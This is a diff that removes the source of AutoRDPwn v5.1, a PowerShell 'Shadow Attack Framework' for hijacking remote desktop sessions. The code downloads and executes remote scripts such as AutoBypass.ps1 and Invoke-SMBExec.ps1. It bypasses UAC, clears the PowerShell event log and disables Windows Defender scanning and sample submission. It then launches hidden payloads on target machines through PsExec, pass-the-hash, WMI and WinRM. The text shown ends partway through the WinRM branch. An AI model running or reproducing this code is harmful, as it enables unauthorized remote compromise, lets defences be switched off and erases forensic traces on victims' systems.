@@ -1,791 +1,2429 @@
-﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform ; $ErrorActionPreference = "SilentlyContinue"
-$arglist = @($args)
-if ($arglist -contains '-noadmin') { $noadmin='-noadmin' }
-if ($arglist -contains '-nogui') { $nogui='-nogui' }
-if ($arglist -contains '-lang') { $lang='-lang' ; $langval = $arglist[($arglist.IndexOf('-lang'))+1] ; if(!$langval) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
-if ($arglist -contains '-option') { $option='-option' ; $optionval = $arglist[($arglist.IndexOf('-option'))+1] ; if(!$optionval) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
-if ($arglist -contains '-shadow') { $shadowoption='-shadow' ; $shadowval = $arglist[($arglist.IndexOf('-shadow'))+1] ; if(!$shadowval) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
-if ($arglist -contains '-createuser') { $createuser='-createuser' }
-if ($arglist -contains '-noclean') { $noclean='-noclean' }
-if ($PSScriptRoot) { $localpath = $PSScriptRoot } else { $localpath = $pwd }
-$checkpath = Get-ChildItem "$localpath\resources\Scripts" ; if ($? -eq $true){ $local = "True" ; Get-ChildItem -Path $localpath -Recurse | Unblock-File }
-[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy() ; [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-try { $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols } catch { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }
-
-if ($OSVersion -like 'Win*'){ if ($local){ Import-Module $localpath\Resources\Scripts\AutoBypass.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1')}
-if ($local){ Import-Module $localpath\Resources\Design\NinjaStyle.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Design/NinjaStyle.ps1')}
-if ($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { if ($local){ Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass Start-Process powershell -NoNewWindow -WorkingDirectory '$localpath' -ArgumentList '$PSCommandPath' $args" ; exit }
-else { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File '$PSCommandPath' $args" ; exit }}}
-
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.1 - by @JoelGMSec" ; $ProgressPreference = "SilentlyContinue" ; Set-StrictMode -Off ; $LogEngineLifeCycleEvent=$false ; $LogEngineHealthEvent=$false ; $LogProviderLifeCycleEvent=$false ; $LogProviderHealthEvent=$false ; Clear-EventLog "Windows PowerShell"
-$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
-
-if ($local){ Import-Module $localpath\Resources\Design\Disable-Close.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Design/Disable-Close.ps1')}
-if (!$local){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Design/AutoRDPwn.ico","AutoRDPwn.ico")}
-if (!$local){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Design/Set-ConsoleIcon.ps1","Set-ConsoleIcon.ps1")}
-if ($local){ .\Resources\Design\Set-ConsoleIcon.ps1 .\Resources\Design\AutoRDPwn.ico } if (!$local){ .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico }}
-
-function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if($nogui -like '-nogui') { $null } else { 
-     Write-Host
-     Write-Host "    ___          __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "_________ _________ ________ " -NoNewLine -ForegroundColor Blue ; Write-Host "               " -ForegroundColor Green
-     Write-Host "  /  _  \  __ __|  |_ ___ " -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \_______  \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "  _  ___ ___  " -ForegroundColor Green
-     Write-Host " /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta ; Write-Host "|       _/| |    \  |    ___/" -NoNewLine -ForegroundColor Blue ; Write-Host "\/ \/  /     \ " -ForegroundColor Green
-     Write-Host "/  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta ; Write-Host "|   |    \| |____/  |   |" -NoNewLine -ForegroundColor Blue ; Write-Host " \        /   |   \" -ForegroundColor Green
-     Write-Host "\  _______/_____/__|\_____/" -NoNewLine -ForegroundColor Magenta ; Write-Host "|___|__  /_________/|___|" -NoNewLine -ForegroundColor Blue ; Write-Host "  \__/\__/|___|_  /" -ForegroundColor Green
-     Write-Host " \/                        " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/                " -NoNewLine -ForegroundColor Blue ; Write-Host "                \/ " -ForegroundColor Green
-     Write-Host
-     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
-     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v5.1" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
-     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  https://github.com/JoelGMSec/AutoRDPwn" -NoNewLine -ForegroundColor Yellow ; Write-Host " :: " -NoNewLine -ForegroundColor Gray ; Write-Host "https://darkbyte.net" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
-     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
-     Write-Host }}
-
-function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - English" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Spanish" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - French" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - German" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Italian" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Russian" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Portuguese" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "H" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Help" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Exit" -ForegroundColor Gray
-     Write-Host }}
-
-function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - PSexec (SMB)" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Pass the Hash (SMB)" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Management Instrumentation (WMI)" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Management (WinRM)" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Assistance (WinRS)" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Local Session Hijacking (TSCon)" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Execution (RDP)" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt1" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-     Write-Host }}
-
-function Show-Modules { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt17" -ForegroundColor Gray
-     Write-Host "     $txt88" -ForegroundColor DarkGray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt50" -ForegroundColor Gray
-     Write-Host "     $txt89" -ForegroundColor DarkGray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Networking / Pivoting" -ForegroundColor Gray
-     Write-Host "     $txt90" -ForegroundColor DarkGray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Forensics" -ForegroundColor Gray
-     Write-Host "     $txt91" -ForegroundColor DarkGray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt64" -ForegroundColor Gray
-     Write-Host "     $txt92" -ForegroundColor DarkGray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt68" -ForegroundColor Gray
-     Write-Host "     $txt93" -ForegroundColor DarkGray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt69" -ForegroundColor Gray
-     Write-Host "     $txt94" -ForegroundColor DarkGray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-     Write-Host }}
-
-function ConvertFrom-SecureToPlain {
-    param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
-    $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
-    $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
-    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
-    $PlainTextPassword }
-
-function Test-Command {
-    Param ($command)
-    $oldPreference = $ErrorActionPreference
-    $ErrorActionPreference = 'stop'
-    try {if(Get-Command $command){RETURN $true}}
-    Catch {RETURN $false}
-    Finally {$ErrorActionPreference=$oldPreference}}
-
-function Remove-Exclusions { 
-    $exclusion = Get-MpPreference ; $exclusion.exclusionprocess | % { Remove-MpPreference -ExclusionProcess $_ 2>&1> $null }
-    $exclusion = Get-MpPreference ; $exclusion.exclusionpath | % { Remove-MpPreference -ExclusionPath $_ 2>&1> $null }
-    $exclusion = Get-MpPreference ; $exclusion.exclusionextension | % { Remove-MpPreference -ExclusionExtension $_ 2>&1> $null }
-    Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:localhostClientTrustedHosts -Force 2>&1> $null 
-    Set-MpPreference -SubmitSamplesConsent 1 2>&1> $null ; Set-MpPreference -MAPSReporting 2 2>&1> $null ; Set-MpPreference -DisableScriptScanning 0 2>&1> $null }
-
-    $question = { Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine -ForegroundColor Gray }
-    if(!$nogui){ 
-    $help = "The detailed guide of use can be found at the following link:"
-
-    do { Show-Banner ; Show-Language ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-    $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $input = $Host.UI.ReadLine() ; switch ($input) {
-
-       '1' { $language = 'English' }
-       '2' { $language = 'Spanish' }
-       '3' { $language = 'French' }
-       '4' { $language = 'German' }
-       '5' { $language = 'Italian' }
-       '6' { $language = 'Russian' }
-       '7' { $language = 'Portuguese' }
-       'H' { Write-Host ; Write-Host "[i] $help" -ForegroundColor Green ; Write-Host ; Write-Host "https://darkbyte.net/autordpwn-la-guia-definitiva" -ForegroundColor Blue ; Start-Sleep -milliseconds 1500 
-           (New-Object -Com Shell.Application).Open("https://darkbyte.net/autordpwn-la-guia-definitiva")}
-       'X' { return }
-
-    default { $langui = (Get-Culture).Name ; if (!$input) { $Host.UI.RawUI.ForegroundColor = 'Gray'
-    if ($langui -like 'en*') { $input = '1' ; $language = 'English' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "1" -ForegroundColor Green }
-    if ($langui -like 'es*') { $input = '2' ; $language = 'Spanish' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "2" -ForegroundColor Green }
-    if ($langui -like 'fr*') { $input = '3' ; $language = 'French' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "3" -ForegroundColor Green }
-    if ($langui -like 'de*') { $input = '4' ; $language = 'German' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "4" -ForegroundColor Green }
-    if ($langui -like 'it*') { $input = '5' ; $language = 'Italian' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "5" -ForegroundColor Green }
-    if ($langui -like 'ru*') { $input = '6' ; $language = 'Russian' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "6" -ForegroundColor Green }
-    if ($langui -like 'pt*') { $input = '7' ; $language = 'Portuguese' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "7" -ForegroundColor Green }}
-    else { Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} else { continue }}} until ($input -in '1','2','3','4','5','6','7','X')}
-
-    if($lang -like '-lang') { $language=$langval }
-    if($language -in 'English') { if ($local){ Import-Module .\Resources\Languages\English.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Languages/English.ps1')}}
-    if($language -in 'Spanish') { if ($local){ Import-Module .\Resources\Languages\Spanish.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Languages/Spanish.ps1')}}
-    if($language -in 'French') { if ($local){ Import-Module .\Resources\Languages\French.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Languages/French.ps1')}}
-    if($language -in 'German') { if ($local){ Import-Module .\Resources\Languages\German.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Languages/German.ps1')}}
-    if($language -in 'Italian') { if ($local){ Import-Module .\Resources\Languages\Italian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Languages/Italian.ps1')}}
-    if($language -in 'Russian') { if ($local){ Import-Module .\Resources\Languages\Russian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Languages/Russian.ps1')}}
-    if($language -in 'Portuguese') { if ($local){ Import-Module .\Resources\Languages\Portuguese.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Languages/Portuguese.ps1')}}
-    
-    $powershell = $host.version ; if($powershell.major -lt 4) { Write-Host ; Write-Host "[!] $txt3" -ForegroundColor 'Red' ; Write-Host
-    Write-Host "[!] $txt4" -NoNewLine -ForegroundColor 'Red' ; Write-Host -NoNewLine ; Write-Host " https://aka.ms/pscore6" -ForegroundColor 'Blue' ; Write-Host ; Start-Sleep -milliseconds 1500 ; exit }
-    Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null; Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableScriptScanning 1 2>&1> $null
-    Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null ; Set-MpPreference -SubmitSamplesConsent 0 2>&1> $null ; Set-MpPreference -MAPSReporting 0 2>&1> $null
-
-    do { Show-Banner ; Show-Menu
-    $currentuser = [Environment]::username ; if($option -like '-option') { $input=$optionval } else { Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-    $Random = New-Object System.Random ; "$txt7"-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()} ; switch ($input) {
-
-        '1' {
-        if($option) { $computer='localhost' } else {
-        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
-        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
-        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-        if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }}
-        $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-PSexec.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-PSexec.ps1')}
-        if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
-        if($user) { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
-        del .\psexec.exe }
-
-        '2' {
-        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
-        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser ; $user = $currentuser }
-        Write-Host ; & $question ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $domain = $Host.UI.ReadLine() ; if(!$domain) { [Console]::SetCursorPosition(0,"$cursortop")
-        $domain = 'localhost' ; & $question ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
-        do { Write-Host ; & $question ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray ; $hash = $Host.UI.ReadLine()
-        if(!$hash) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $hash )
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SMBExec.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-SMBExec.ps1')}
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn5" }
-
-        '3' {
-        if($option) { $computer='localhost' } else {
-        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
-        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
-        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-        if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
-        $Host.UI.RawUI.ForegroundColor = 'Blue' }
-        if(!$user) { Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn1 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn3 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}
-        if($user) { Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn1 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn3 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}}
-
-        '4' {
-        if($option) { $computer='localhost' } else {
-        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
-        $computer = 'localhost' ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
-        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
-        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-        if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
-        $Host.UI.RawUI.ForegroundColor = 'Blue' }
-        if(!$user) { Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 2>&1> $null ; Write-Host }
